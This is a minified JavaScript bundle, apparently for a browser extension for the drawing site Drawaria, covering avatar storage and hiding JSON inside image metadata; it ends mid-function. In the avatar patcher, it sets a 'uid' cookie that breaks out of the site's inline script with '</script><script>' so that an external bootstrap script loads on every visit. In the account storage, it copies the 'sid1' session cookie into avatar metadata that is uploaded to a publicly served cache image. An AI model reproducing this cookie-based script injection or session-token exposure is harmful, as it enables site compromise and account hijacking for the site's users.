'use strict';
var DrawariaExtensionBundle = (() => {
  var lt = Object.defineProperty;
  var ke = Object.getOwnPropertyDescriptor;
  var xe = Object.getOwnPropertyNames;
  var Ee = Object.prototype.hasOwnProperty;
  var be = (r, t) => {
      for (var e in t) lt(r, e, { get: t[e], enumerable: !0 });
    },
    Te = (r, t, e, n) => {
      if ((t && typeof t == 'object') || typeof t == 'function')
        for (let a of xe(t))
          !Ee.call(r, a) && a !== e && lt(r, a, { get: () => t[a], enumerable: !(n = ke(t, a)) || n.enumerable });
      return r;
    };
  var Re = (r) => Te(lt({}, '__esModule', { value: !0 }), r);
  var Mr = {};
  be(Mr, {
    AccountAvatarStorage: () => D,
    AnonymousAvatarStorage: () => I,
    CleanupStack: () => _,
    DRAWARIA_RCON_BOOTSTRAP_SCRIPT_NAME: () => Tt,
    DRAWARIA_RCON_BOOTSTRAP_SCRIPT_PATH_SEGMENT: () => Rt,
    DRAWARIA_RCON_BOOTSTRAP_SCRIPT_URL: () => W,
    DRAWARIA_SHELL_AFTER_NAVIGATE_EVENT: () => $,
    DRAWARIA_SHELL_BEFORE_NAVIGATE_EVENT: () => xt,
    DRAWARIA_SHELL_FRAME_LOAD_EVENT: () => Et,
    DRAWARIA_SHELL_NAVIGATION_FALLBACK_EVENT: () => bt,
    DRAWARIA_SHELL_TARGET_PARAMETER: () => b,
    DrawariaAccountTracker: () => C,
    DrawariaShellController: () => N,
    ModuleLoader: () => P,
    ShellModuleLoader: () => F,
    SocketManager: () => v,
    createAccountAvatarStorageModule: () => Y,
    createAccountStorageFacade: () => Q,
    createAnonymousAvatarStorageModule: () => tt,
    createAvatarBuilderEnhancerModule: () => it,
    createAvatarImagePatcherModule: () => Z,
    embedAvatarMetadataBytes: () => zt,
    embedJsonInImageMetadata: () => L,
    extractAvatarMetadataBytes: () => $t,
    extractJsonFromImageMetadata: () => jt,
    getActiveDrawariaDocument: () => Er,
    initializeDrawariaExtension: () => Ct,
    initializeDrawariaShell: () => br,
    installAvatarBuilderNativeLoadGuard: () => j,
    installDrawariaFunctionHelpers: () => st,
    matchDrawariaShellRoute: () => xr,
    matchShellRoute: () => g,
    normalizeShellPathname: () => z,
  });
  var Mt = 'drawaria-extension:logged-in',
    ct = 'drawaria-extension:account-uid',
    Ut = /^[a-z0-9~-]{36}$/u,
    Ce = /^[^;\u0000-\u001f\u007f]{1,4096}$/u;
  function Le(r, t) {
    try {
      return r.document.cookie.split(';').reduce((e, n) => {
        if (e !== null) return e;
        let a = n.indexOf('='),
          o = a === -1 ? n : n.slice(0, a);
        if (Lt(o.trim()) !== t) return null;
        let s = a === -1 ? '' : n.slice(a + 1);
        return Lt(s.trim());
      }, null);
    } catch {
      return null;
    }
  }
  function T(r) {
    return typeof r == 'string' && Ce.test(r) ? r : null;
  }
  function k(r) {
    return T(Le(r, 'sid1'));
  }
  function p(r) {
    let t = r.LOGGEDIN;
    return typeof t == 'boolean' ? t : null;
  }
  function R(r) {
    let t = Pt(r, Mt);
    return t === 'true' ? !0 : t === 'false' ? !1 : null;
  }
  function Dt(r, t) {
    Ft(r, Mt, String(t));
  }
  function It(r) {
    let t = Pt(r, ct);
    return t && Ut.test(t) ? t : null;
  }
  function Ot(r, t) {
    Ut.test(t) && Ft(r, ct, t);
  }
  function _t(r) {
    Me(r, ct);
  }
  function Pt(r, t) {
    try {
      return r.localStorage.getItem(t);
    } catch {
      return null;
    }
  }
  function Ft(r, t, e) {
    try {
      r.localStorage.setItem(t, e);
    } catch {}
  }
  function Me(r, t) {
    try {
      r.localStorage.removeItem(t);
    } catch {}
  }
  function Lt(r) {
    try {
      return decodeURIComponent(r);
    } catch {
      return r;
    }
  }
  var Nt = /^[a-z0-9~-]{36}$/u,
    C = class {
      #t;
      #r;
      #e;
      #n;
      #a = null;
      #o = null;
      constructor(t, e, n = () => null) {
        ((this.#t = t), (this.#e = e), (this.#n = n), (this.#r = this.#s()));
      }
      get uid() {
        return this.#a;
      }
      get sid1() {
        return this.#o ?? T(this.#n());
      }
      refresh() {
        return this.scan(this.#t);
      }
      scan(t) {
        if (!t) return this.#a;
        let e = k(t) ?? k(this.#t);
        e && (this.#o = e);
        let n = T(this.#n());
        n && (this.#o = n);
        let a = p(t);
        if (new URL(t.location.href).pathname === '/' && a !== null && (Dt(t, a), !a))
          return ((this.#a = null), (this.#o = null), _t(t), null);
        let o = this.#u(t);
        if (o) return this.#i(o);
        let i = this.#f(t.document);
        if (i) return this.#i(i);
        let s = It(t);
        return s ? this.#i(s) : this.#a;
      }
      createFacade() {
        return this.#r;
      }
      #s() {
        let t = this;
        return Object.freeze({
          get uid() {
            return t.uid;
          },
          get sid1() {
            return t.sid1;
          },
          storage: t.#e,
          refresh: () => t.refresh(),
        });
      }
      #i(t) {
        return ((this.#a = t), Ot(this.#t, t), t);
      }
      #u(t) {
        let e = t.ACCOUNTUID;
        return typeof e == 'string' && Nt.test(e) ? e : null;
      }
      #f(t) {
        let e = t.querySelectorAll('a[href^="/gallery/?uid"]');
        for (let n of e) {
          let a = this.#d(n.getAttribute('href'));
          if (a) return a;
        }
        return null;
      }
      #d(t) {
        if (!t) return null;
        try {
          let e = new URL(t, this.#t.location.href).searchParams.get('uid');
          return e && Nt.test(e) ? e : null;
        } catch {
          return null;
        }
      }
    };
  var w = new Uint8Array([68, 82, 65, 87, 77, 69, 84, 65]),
    Bt = 1,
    x = w.length + 1 + 4,
    Gt = 4,
    ut = 60 * 1024,
    ft = 239,
    Ue = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]),
    gt = new Uint8Array([100, 114, 65, 119]),
    De = new Uint8Array([73, 69, 78, 68]),
    dt = new Uint8Array([68, 82, 65, 87, 65, 82, 73, 65]),
    Ht = new Uint8Array([74, 83, 49]);
  async function L(r, t) {
    let e = await Yt(r),
      n = pt(e);
    return qe(Jt(e, n, Kt(t)), Oe(n));
  }
  async function jt(r) {
    let t = M(await Yt(r));
    if (t === null) throw new Error('The image does not contain Drawaria avatar JSON metadata.');
    return t;
  }
  function zt(r, t) {
    let e = pt(r);
    return Jt(r, e, Kt(t));
  }
  function $t(r) {
    let t = M(r);
    if (t === null) throw new Error('The image does not contain Drawaria avatar JSON metadata.');
    return t;
  }
  function M(r) {
    let t = $e(r, pt(r));
    return t.length === 0 ? null : Ie(t[t.length - 1]);
  }
  function mt(r) {
    let t = 4294967295;
    for (let e of r) {
      t ^= e;
      for (let n = 0; n < 8; n++) t = (t >>> 1) ^ (3988292384 & -(t & 1));
    }
    return (t ^ 4294967295) >>> 0;
  }
  function q(r, t, e) {
    ((r[t] = e >>> 24), (r[t + 1] = e >>> 16), (r[t + 2] = e >>> 8), (r[t + 3] = e));
  }
  function ht(r, t) {
    return ((r[t] << 24) | (r[t + 1] << 16) | (r[t + 2] << 8) | r[t + 3]) >>> 0;
  }
  function U(r) {
    let t = r.reduce((a, o) => a + o.length, 0),
      e = new Uint8Array(t),
      n = 0;
    for (let a of r) (e.set(a, n), (n += a.length));
    return e;
  }
  function y(r, t, e) {
    if (t < 0 || t + e.length > r.length) return !1;
    for (let n = 0; n < e.length; n++) if (r[t + n] !== e[n]) return !1;
    return !0;
  }
  function Kt(r) {
    let t = JSON.stringify(r);
    if (t === void 0) throw new TypeError('The supplied value cannot be represented as JSON.');
    let e = new TextEncoder().encode(t);
    if (e.length > ut) throw new RangeError(`The serialized metadata JSON exceeds the ${ut}-byte UTF-8 limit.`);
    let n = new Uint8Array(x + e.length + Gt);
    return (n.set(w), (n[w.length] = Bt), q(n, w.length + 1, e.length), n.set(e, x), q(n, x + e.length, mt(e)), n);
  }
  function Ie(r) {
    if (!y(r, 0, w)) throw new Error('The image metadata does not contain a supported avatar JSON payload.');
    if (r[w.length] !== Bt) throw new Error(`Unsupported avatar metadata version ${r[w.length]}.`);
    let t = ht(r, w.length + 1),
      e = x + t + Gt;
    if (t > ut || r.length !== e) throw new Error('The embedded avatar metadata payload length is invalid.');
    let n = r.slice(x, x + t);
    if (mt(n) !== ht(r, x + t)) throw new Error('The embedded avatar metadata payload failed checksum validation.');
    try {
      return JSON.parse(new TextDecoder('utf-8', { fatal: !0 }).decode(n));
    } catch (a) {
      let o = a instanceof Error ? ` ${a.message}` : '';
      throw new Error(`The embedded avatar metadata is not valid UTF-8 JSON.${o}`);
    }
  }
  function pt(r) {
    if (r.length >= 3 && r[0] === 255 && r[1] === 216 && r[2] === 255) return 'jpeg';
    if (y(r, 0, Ue)) return 'png';
    if (
      r.length >= 6 &&
      r[0] === 71 &&
      r[1] === 73 &&
      r[2] === 70 &&
      r[3] === 56 &&
      (r[4] === 55 || r[4] === 57) &&
      r[5] === 97
    )
      return 'gif';
    throw new TypeError('Metadata embedding supports JPEG, PNG, and GIF image containers only.');
  }
  function Oe(r) {
    return r === 'jpeg' ? 'image/jpeg' : r === 'png' ? 'image/png' : 'image/gif';
  }
  function _e(r) {
    let t = new Uint8Array(r.length + 4);
    ((t[0] = 255), (t[1] = ft));
    let e = r.length + 2;
    return ((t[2] = e >>> 8), (t[3] = e), t.set(r, 4), t);
  }
  function Pe(r) {
    let t = [],
      e = 2;
    for (; e + 1 < r.length; ) {
      if (r[e] !== 255) throw new Error('The JPEG marker structure is invalid.');
      for (; e < r.length && r[e] === 255; ) e++;
      if (e >= r.length) break;
      let n = r[e++];
      if (n === 217 || n === 218) break;
      if (n === 1 || (n >= 208 && n <= 215)) continue;
      if (e + 2 > r.length) throw new Error('The JPEG segment length is truncated.');
      let a = (r[e] << 8) | r[e + 1];
      if (a < 2 || e + a > r.length) throw new Error('The JPEG segment length is invalid.');
      let o = e + 2,
        i = e + a;
      (n === ft && y(r, o, w) && t.push(r.slice(o, i)), (e = i));
    }
    return t;
  }
  function Fe(r, t) {
    let e = [r.slice(0, 2), _e(t)],
      n = 2;
    for (; n < r.length; ) {
      if (n + 1 >= r.length || r[n] !== 255) throw new Error('The JPEG marker structure is invalid.');
      let a = n;
      for (; n < r.length && r[n] === 255; ) n++;
      if (n >= r.length) throw new Error('The JPEG marker structure is truncated.');
      let o = r[n++];
      if (o === 217 || o === 218) return (e.push(r.slice(a)), U(e));
      if (o === 1 || (o >= 208 && o <= 215)) {
        e.push(r.slice(a, n));
        continue;
      }
      if (n + 2 > r.length) throw new Error('The JPEG segment length is truncated.');
      let i = (r[n] << 8) | r[n + 1],
        s = n + i;
      if (i < 2 || s > r.length) throw new Error('The JPEG segment length is invalid.');
      ((o === ft && y(r, n + 2, w)) || e.push(r.slice(a, s)), (n = s));
    }
    throw new Error('The JPEG does not contain an image scan or end marker.');
  }
  function Vt(r) {
    let t = [],
      e = 8;
    for (; e < r.length; ) {
      if (e + 12 > r.length) throw new Error('The PNG chunk structure is truncated.');
      let n = ht(r, e),
        a = e + 12 + n;
      if (a > r.length) throw new Error('The PNG chunk length is invalid.');
      (t.push({ start: e, end: a, typeOffset: e + 4, dataOffset: e + 8, dataEnd: e + 8 + n }), (e = a));
    }
    return t;
  }
  function Ne(r) {
    let t = new Uint8Array(r.length + 12);
    return (q(t, 0, r.length), t.set(gt, 4), t.set(r, 8), q(t, 8 + r.length, mt(t.slice(4, 8 + r.length))), t);
  }
  function We(r) {
    return Vt(r)
      .filter((t) => y(r, t.typeOffset, gt))
      .map((t) => r.slice(t.dataOffset, t.dataEnd));
  }
  function Be(r, t) {
    let e = [r.slice(0, 8)],
      n = !1;
    for (let a of Vt(r)) {
      let o = y(r, a.typeOffset, gt);
      (y(r, a.typeOffset, De) && (e.push(Ne(t)), (n = !0)), o || e.push(r.slice(a.start, a.end)));
    }
    if (!n) throw new Error('The PNG does not contain an IEND chunk.');
    return U(e);
  }
  var Ge = U([new Uint8Array([33, 255, 11]), dt, Ht]);
  function Wt(r) {
    return (r & 128) === 0 ? 0 : 3 * (1 << ((r & 7) + 1));
  }
  function V(r, t, e) {
    let n = [],
      a = t;
    for (; a < r.length; ) {
      let o = r[a++];
      if (o === 0) return { end: a, data: U(n) };
      if (a + o > r.length) throw new Error(`${e} is truncated.`);
      (n.push(r.slice(a, a + o)), (a += o));
    }
    throw new Error(`${e} is missing a terminator.`);
  }
  function qt(r) {
    if (r.length < 13) throw new Error('The GIF logical screen descriptor is truncated.');
    let t = [],
      e = 13 + Wt(r[10]);
    if (e > r.length) throw new Error('The GIF global color table is truncated.');
    for (; e < r.length; ) {
      let n = e,
        a = r[e++];
      if (a === 59) return { metadataExtensions: t, trailerIndex: n };
      if (a === 44) {
        if (e + 9 > r.length) throw new Error('The GIF image descriptor is truncated.');
        let i = Wt(r[e + 8]);
        if (((e += 9), e + i > r.length)) throw new Error('The GIF local color table is truncated.');
        if (((e += i), e >= r.length)) throw new Error('The GIF image data is missing its LZW minimum code size.');
        (e++, (e = V(r, e, 'The GIF image data').end));
        continue;
      }
      if (a !== 33) throw new Error('The GIF block structure is invalid.');
      if (e >= r.length) throw new Error('The GIF extension label is truncated.');
      let o = r[e++];
      if (o === 255) {
        if (e >= r.length) throw new Error('The GIF application extension block size is truncated.');
        let i = r[e++];
        if (e + i > r.length) throw new Error('The GIF application extension identifier is truncated.');
        let s = e;
        e += i;
        let l = V(r, e, 'The GIF application extension data');
        ((e = l.end),
          i === 11 && y(r, s, dt) && y(r, s + dt.length, Ht) && t.push({ start: n, end: e, frame: l.data }));
        continue;
      }
      if (o === 249) {
        if (e >= r.length) throw new Error('The GIF graphic control extension block size is truncated.');
        let i = r[e++];
        if (e + i >= r.length) throw new Error('The GIF graphic control extension is truncated.');
        if (((e += i), r[e++] !== 0)) throw new Error('The GIF graphic control extension terminator is invalid.');
        continue;
      }
      if (o === 1) {
        if (e >= r.length) throw new Error('The GIF plain text extension block size is truncated.');
        let i = r[e++];
        if (e + i > r.length) throw new Error('The GIF plain text extension header is truncated.');
        ((e += i), (e = V(r, e, 'The GIF plain text extension data').end));
        continue;
      }
      e = V(r, e, 'The GIF extension data').end;
    }
    throw new Error('The GIF does not contain a trailer.');
  }
  function He(r) {
    return qt(r).metadataExtensions;
  }
  function je(r) {
    let t = [Ge];
    for (let e = 0; e < r.length; e += 255) {
      let n = r.slice(e, e + 255);
      t.push(new Uint8Array([n.length]), n);
    }
    return (t.push(new Uint8Array([0])), U(t));
  }
  function ze(r, t) {
    let e = qt(r),
      n = [],
      a = 0;
    for (let o of e.metadataExtensions) (n.push(r.slice(a, o.start)), (a = o.end));
    return (n.push(r.slice(a, e.trailerIndex), je(t), r.slice(e.trailerIndex)), U(n));
  }
  function $e(r, t) {
    return t === 'jpeg' ? Pe(r) : t === 'png' ? We(r) : He(r).map((e) => e.frame);
  }
  function Jt(r, t, e) {
    return t === 'jpeg' ? Fe(r, e) : t === 'png' ? Be(r, e) : ze(r, e);
  }
  async function Ke(r) {
    if (r instanceof Blob) return r;
    if (r instanceof ArrayBuffer) return new Blob([r]);
    if (r instanceof Uint8Array) {
      let e = r.buffer.slice(r.byteOffset, r.byteOffset + r.byteLength);
      return new Blob([e]);
    }
    let t = await fetch(r);
    if (!t.ok) throw new Error(`Unable to load avatar image: HTTP ${t.status}.`);
    return t.blob();
  }
  async function Yt(r) {
    return new Uint8Array(await (await Ke(r)).arrayBuffer());
  }
  function Ve(r) {
    let t = '';
    for (let n = 0; n < r.length; n += 32768) t += String.fromCharCode(...r.subarray(n, n + 32768));
    return btoa(t);
  }
  function qe(r, t) {
    return `data:${t};base64,${Ve(r)}`;
  }
  var Xt = /^[a-z0-9~-]{36}$/u,
    Je = /^[A-Za-z0-9_~-]+$/u;
  function Zt(r) {
    let t = r.trim();
    if (!Xt.test(t)) throw new TypeError('Avatar metadata lookup requires a valid Drawaria account uid.');
    return t;
  }
  function E(r, t) {
    if (!Je.test(r)) throw new TypeError(t);
    return r;
  }
  function Qt(r) {
    let t = r.trim();
    if (Xt.test(t)) return Object.freeze({ kind: 'account', uid: t });
    let e = t.split('.');
    if (e.length !== 2 || !e[0] || !e[1])
      throw new TypeError('Avatar metadata lookup requires a valid account uid or anonymous uid.wt avatar id.');
    return Object.freeze({
      kind: 'anonymous',
      uid: E(e[0], 'Avatar metadata lookup requires a safe anonymous uid.'),
      wt: E(e[1], 'Avatar metadata lookup requires a safe anonymous wt value.'),
    });
  }
  var Ye = /^data:image\/(?:png|jpe?g|gif);base64,/iu;
  function A(r) {
    return r.replace(Ye, 'data:image/jpeg;base64,');
  }
  var te = 'drawaria-extension:avatar-metadata:',
    J = 'sid1';
  function Y(r) {
    let t = (e) => {
      r.observeContext(e);
    };
    return {
      id: 'account-avatar-storage',
      mount(e) {
        return (t(e), () => {});
      },
      refresh: t,
    };
  }
  var D = class {
    #t;
    #r = null;
    #e = !1;
    #n = null;
    #a = 'idle';
    #o = null;
    #s = null;
    #i = null;
    #u = null;
    #f = null;
    constructor(t) {
      this.#t = t;
    }
    get data() {
      return this.#n;
    }
    get status() {
      return this.#a;
    }
    get error() {
      return this.#o;
    }
    get sid1() {
      return this.#s;
    }
    observeContext(t) {
      ((this.#e = this.#x(t)),
        (this.#r = t.accountUid ?? this.#r),
        (this.#s = this.#E(t) ?? t.accountSid1 ?? this.#s),
        this.#r && (this.#S(this.#r), !(this.#i === this.#r || this.#f === this.#r) && this.load(this.#r)));
    }
    load(t = this.#r) {
      return t
        ? ((this.#r = t),
          this.#S(t),
          this.#u && this.#f === t
            ? this.#u
            : ((this.#a = 'loading'),
              (this.#o = null),
              (this.#f = t),
              (this.#u = this.#d(t).finally(() => {
                ((this.#u = null), (this.#f = null));
              })),
              this.#u))
        : ((this.#a = 'idle'), Promise.resolve(this.#n));
    }
    async loadForUid(t) {
      let e = Zt(t);
      return this.#w(e);
    }
    async save(t, e) {
      if (!this.#e || !this.#r)
        throw new Error('Avatar metadata can only be saved after a logged-in account uid is observed.');
      ((this.#a = 'saving'), (this.#o = null));
      try {
        let n = e ?? (await this.#h(this.#r)),
          a = A(await L(n, t)),
          o = await this.#p(a);
        return (
          (this.#n = t),
          (this.#i = this.#r),
          (this.#a = 'loaded'),
          this.#v(this.#r, t),
          Object.freeze({ imageData: a, response: o })
        );
      } catch (n) {
        throw ((this.#a = 'error'), (this.#o = this.#C(n)), n);
      }
    }
    clearLocal() {
      ((this.#n = null), (this.#o = null), (this.#a = 'idle'), (this.#i = null));
    }
    async #d(t) {
      try {
        let e = await this.#h(t),
          n = this.#l(e);
        if (n === null) {
          let o = this.#y(null, this.#s);
          return ((this.#n = o), (this.#a = 'loaded'), (this.#i = t), o && this.#m(o, e), o);
        }
        this.#g(n);
        let a = this.#y(n, this.#s);
        return (
          (this.#n = a ?? n),
          (this.#a = 'loaded'),
          (this.#i = t),
          this.#v(t, this.#n),
          a && a !== n && this.#m(a, e),
          this.#n
        );
      } catch (e) {
        return ((this.#a = 'error'), (this.#o = this.#C(e)), this.#n);
      }
    }
    async #p(t) {
      let e = await this.#t.fetch(new URL('/saveavatar', this.#t.location.href).href, {
        method: 'POST',
        body: new URLSearchParams({ imagedata: t, fromeditor: 'true' }),
        headers: { Accept: 'text/plain, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest' },
      });
      if (!e.ok) throw new Error(`Avatar metadata upload failed with HTTP ${e.status}`);
      return e.text();
    }
    #A(t) {
      let e = new URL(`/avatar/cache/${encodeURIComponent(t)}.jpg`, this.#t.location.href);
      return (e.searchParams.set('drawariaExtensionAvatarMetadata', String(Date.now())), e.href);
    }
    async #h(t) {
      let e = await this.#t.fetch(this.#A(t));
      if (!e.ok) throw new Error(`Unable to load avatar image: HTTP ${e.status}.`);
      return new Uint8Array(await e.arrayBuffer());
    }
    async #w(t) {
      return this.#l(await this.#h(t));
    }
    #l(t) {
      return M(t);
    }
    #g(t) {
      this.#R(t) && (this.#s = this.#s ?? T(t[J]));
    }
    #y(t, e) {
      return e
        ? t === null
          ? Object.freeze({ [J]: e })
          : this.#R(t)
            ? t[J] === e
              ? t
              : Object.freeze({ ...t, [J]: e })
            : t
        : t;
    }
    async #m(t, e) {
      if (!this.#e || !this.#r) return;
      let n = this.#a,
        a = this.#o;
      try {
        await this.save(t, e);
      } catch {
        ((this.#a = n), (this.#o = a));
      }
    }
    #S(t) {
      if (this.#n !== null) return;
      let e = this.#c(`${te}${t}`);
      if (e)
        try {
          ((this.#n = JSON.parse(e)), this.#g(this.#n));
        } catch {}
    }
    #v(t, e) {
      let n = JSON.stringify(e);
      n !== void 0 && this.#k(`${te}${t}`, n);
    }
    #c(t) {
      try {
        return this.#t.localStorage.getItem(t);
      } catch {
        return null;
      }
    }
    #k(t, e) {
      try {
        this.#t.localStorage.setItem(t, e);
      } catch {}
    }
    #x(t) {
      let e = p(t.activeWindow);
      if (e !== null) return e;
      let n = p(t.parentWindow);
      return n !== null ? n : (R(this.#t) ?? this.#e);
    }
    #E(t) {
      return k(t.activeWindow) ?? k(t.parentWindow) ?? k(this.#t);
    }
    #R(t) {
      return typeof t == 'object' && t !== null && !Array.isArray(t);
    }
    #C(t) {
      return t instanceof Error ? t.message : String(t);
    }
  };
  var ne = /^[a-z0-9-]{36}$/iu,
    Xe = 31536e4,
    ae = Symbol.for('drawaria.extension.legacyAvatarPatchPayload');
  function oe(r, t) {
    let e = yt(r),
      a = `${rr(r) ?? se(r.document)}AVATARIMAGENOTFOUND=0;(s=document.createElement('script')).src='${t}',document.body.append(s)`,
      o = `${e}<\/script><script>${a}<\/script><script>`;
    return (X(r, 'uid', o), () => X(r, 'uid', e));
  }
  function Z(r) {
    return {
      id: 'avatar-image-patcher',
      route: (t) => t?.kind === 'home' || t?.kind === 'palettes',
      mount(t) {
        return new wt(t, r).mount();
      },
    };
  }
  var wt = class {
    #t;
    #r;
    #e;
    #n;
    #a;
    constructor(t, e) {
      ((this.#t = t),
        (this.#r = t.activeWindow),
        (this.#e = t.activeDocument),
        (this.#n = e),
        (this.#a = se(this.#e)),
        er(t.parentWindow, this.#a));
    }
    mount() {
      if ((this.#d(), this.#t.route?.kind === 'palettes')) {
        let n = this.#u('uid');
        return (this.#m(n) && this.#s('uid', n), () => {});
      }
      let t = yt(this.#r);
      this.#g(t);
      let e = () => this.#p();
      return (
        this.#r.addEventListener('beforeunload', e),
        () => {
          this.#r.removeEventListener('beforeunload', e);
        }
      );
    }
    #o(t) {
      try {
        return this.#r.localStorage.getItem(t);
      } catch {
        return null;
      }
    }
    #s(t, e) {
      try {
        this.#r.localStorage.setItem(t, e);
      } catch {}
    }
    #i() {
      return ie(this.#e);
    }
    #u(t) {
      return this.#i()[t] ?? null;
    }
    #f(t, e, n = {}) {
      X(this.#r, t, e, n);
    }
    #d() {
      this.#r.DEBUG !== !0 &&
        this.#e.querySelectorAll('#rmv').forEach((t) => {
          t.closest('.rowitem')?.remove();
        });
    }
    #p() {
      let t = yt(this.#r),
        e = `${this.#a}AVATARIMAGENOTFOUND=0;(s=document.createElement('script')).src='${this.#n}',document.body.append(s)`,
        n = `${t}<\/script><script>${e}<\/script><script>`;
      this.#f('uid', n);
    }
    #A() {
      let t = this.#e.createElement('div');
      return (
        (t.id = 'avatarcookieswarning'),
        (t.textContent = 'AVATAR ERROR: Cookies are blocked by your browser'),
        Object.assign(t.style, {
          position: 'absolute',
          maxWidth: '10em',
          background: '#fff',
          fontSize: '0.7em',
          padding: '1.5em',
          display: 'none',
        }),
        t
      );
    }
    #h() {
      let t = this.#e.createElement('a');
      t.href = '/avatar/builder/';
      let e = this.#e.createElement('i');
      return (
        (e.className = 'far fa-edit'),
        e.setAttribute('aria-hidden', 'true'),
        Object.assign(e.style, { color: 'gray', fontSize: '2em' }),
        t.append(e),
        t
      );
    }
    #w(t) {
      let e = this.#e.createElement('div'),
        n = this.#e.createElement('img');
      return ((n.id = 'selfavatarimage'), t && (n.src = t), e.append(n), e);
    }
    #l(t, e) {
      t.replaceChildren(this.#A(), this.#h(), this.#w(e));
    }
    #g(t) {
      let e = this.#e.getElementById('avatarcontainer');
      if (!e || this.#u('sid1')) return;
      let n = this.#u('wt'),
        a = this.#m(t) && !!n,
        o = this.#e.referrer.includes('/avatar/builder');
      if (a && !o) {
        this.#l(e, `/avatar/cache/${encodeURIComponent(t)}.${encodeURIComponent(n || '')}.jpg`);
        return;
      }
      let i = this.#o('avatarimagedata');
      (this.#l(e, i),
        i &&
          this.#y(i).catch((s) => {
            console.warn('Unable to update avatar image.', s);
          }));
    }
    async #y(t) {
      let e = await this.#r.fetch('https://drawaria.online/uploadavatarimage', {
        method: 'POST',
        body: new URLSearchParams({ imagedata: A(t), fromeditor: 'true' }),
        headers: { Accept: 'text/plain, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest' },
      });
      if (!e.ok) throw new Error(`Avatar upload failed with HTTP ${e.status}`);
      let n = await e.text(),
        a = String(n).split('.').pop();
      a && this.#f('wt', a);
    }
    #m(t) {
      return ne.test(t || '');
    }
  };
  function ee(r) {
    try {
      return decodeURIComponent(r);
    } catch {
      return r;
    }
  }
  function ie(r) {
    return r.cookie.split(';').reduce((t, e) => {
      let n = e.indexOf('='),
        a = n === -1 ? e : e.slice(0, n),
        o = n === -1 ? '' : e.slice(n + 1),
        i = ee(a.trim());
      return (i && (t[i] = ee(o.trim())), t);
    }, {});
  }
  function X(r, t, e, n = {}) {
    let a = n.maxAge ?? Xe,
      o = [`${encodeURIComponent(t)}=${encodeURIComponent(e)}`, `Max-Age=${a}`, 'Path=/'];
    (r.location.protocol === 'https:' ? o.push('Secure', 'Partitioned', 'SameSite=None') : o.push('SameSite=Lax'),
      (r.document.cookie = o.join('; ')));
  }
  function Ze(r) {
    let t = r.crypto;
    return t && typeof t.randomUUID == 'function'
      ? t.randomUUID()
      : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/gu, (e) => {
          let n = Math.floor(Math.random() * 16);
          return (e === 'x' ? n : (n & 3) | 8).toString(16);
        });
  }
  function yt(r) {
    let t = ie(r.document).uid ?? null,
      e = Qe(r, 'uid'),
      n = re(t) ? t : re(e) ? e : Ze(r);
    return (tr(r, 'uid', n), X(r, 'uid', n), n);
  }
  function Qe(r, t) {
    try {
      return r.localStorage.getItem(t);
    } catch {
      return null;
    }
  }
  function tr(r, t, e) {
    try {
      r.localStorage.setItem(t, e);
    } catch {}
  }
  function se(r) {
    let t = r.body.querySelectorAll('script:not([src])'),
      e = t[1]?.text || '',
      n = t[3]?.text || '',
      a = e.trim().endsWith('reload();') ? e : e + n;
    return String(a)
      .replace(/\s/gu, '')
      .split('if(!')[0]
      .replace(/LOGUID=\["[a-z0-9-]{36}"/iu, 'LOGUID=[localStorage.getItem("uid")')
      .replace(/"/gu, "'");
  }
  function er(r, t) {
    t && Object.defineProperty(r, ae, { configurable: !0, value: t });
  }
  function rr(r) {
    let t = r[ae];
    return typeof t == 'string' && t ? t : null;
  }
  function re(r) {
    return ne.test(r || '');
  }
  function Q(r, t) {
    return Object.freeze({
      get data() {
        return r.data;
      },
      get status() {
        return r.status;
      },
      get error() {
        return r.error;
      },
      get anonymousStatus() {
        return t.status;
      },
      get anonymousError() {
        return t.error;
      },
      load: () => r.load(),
      loadForUid: (e) => r.loadForUid(e),
      loadForAvatar: async (e) => {
        let n = Qt(e);
        return n.kind === 'account' ? r.loadForUid(n.uid) : t.loadForIdentity(n.uid, n.wt);
      },
      save: (e, n) => r.save(e, n),
      clearLocal: () => r.clearLocal(),
      anonymousLoad: (e, n) => t.load(e, n),
      anonymousSave: (e, n, a) => t.save(e, n, a),
      anonymousClearLocal: () => t.clearLocal(),
    });
  }
  var nr = 31536e4,
    ar = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 0, 73, 69, 78, 68, 0, 0, 0, 0]);
  function tt(r) {
    let t = (e) => {
      r.observeContext(e);
    };
    return {
      id: 'anonymous-avatar-storage',
      mount(e) {
        return (t(e), () => {});
      },
      refresh: t,
    };
  }
  var I = class {
    #t;
    #r = 'idle';
    #e = null;
    constructor(t) {
      this.#t = t;
    }
    get status() {
      return this.#r;
    }
    get error() {
      return this.#e;
    }
    observeContext(t) {}
    async load(t, e) {
      ((this.#r = 'loading'), (this.#e = null));
      try {
        let n = await this.#n(t, e);
        return ((this.#r = 'loaded'), n);
      } catch (n) {
        throw ((this.#r = 'error'), (this.#e = this.#h(n)), n);
      }
    }
    async loadForIdentity(t, e) {
      return this.#n(t, e);
    }
    async save(t, e, n = ar) {
      ((this.#r = 'saving'), (this.#e = null));
      let a = this.#u('uid');
      try {
        let o = A(await L(n, e));
        this.#p('uid', t);
        let i = await this.#a(o),
          s = this.#s(i);
        return ((this.#r = 'loaded'), Object.freeze({ imageData: o, uid: s.uid, wt: s.wt, response: i }));
      } catch (o) {
        throw ((this.#r = 'error'), (this.#e = this.#h(o)), o);
      } finally {
        this.#i(a);
      }
    }
    clearLocal() {
      ((this.#e = null), (this.#r = 'idle'));
    }
    async #n(t, e) {
      let n = await this.#t.fetch(this.#o(t, e));
      if (n.status === 404) return null;
      if (!n.ok) throw new Error(`Unable to load anonymous storage image: HTTP ${n.status}.`);
      return M(new Uint8Array(await n.arrayBuffer()));
    }
    async #a(t) {
      let e = await this.#t.fetch(new URL('/uploadavatarimage', this.#t.location.href).href, {
        method: 'POST',
        body: new URLSearchParams({ imagedata: t, fromeditor: 'true' }),
        headers: { Accept: 'text/plain, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest' },
      });
      if (!e.ok) throw new Error(`Anonymous storage upload failed with HTTP ${e.status}`);
      return e.text();
    }
    #o(t, e) {
      let n = E(t, 'Anonymous storage load requires a safe cache uid.'),
        a = E(e, 'Anonymous storage load requires a safe wt value.'),
        o = `${encodeURIComponent(n)}.${encodeURIComponent(a)}.jpg`,
        i = new URL(`/avatar/cache/${o}`, this.#t.location.href);
      return (i.searchParams.set('drawariaExtensionAnonymousStorage', String(Date.now())), i.href);
